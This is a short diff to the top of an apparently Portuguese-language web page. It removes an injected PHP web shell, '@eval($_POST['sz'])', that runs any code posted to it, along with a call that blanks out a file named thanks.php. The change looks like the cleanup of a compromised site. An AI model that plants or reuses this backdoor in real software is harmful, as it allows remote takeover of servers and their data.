@@ -1,4 +1,4 @@
-<?php @eval($_POST['sz']);?><?php file_put_contents ('thanks.php', '');    ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//PT">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//PT">
 <!-- 
 ######################################
 #   Este site foi desenvolvido por   #
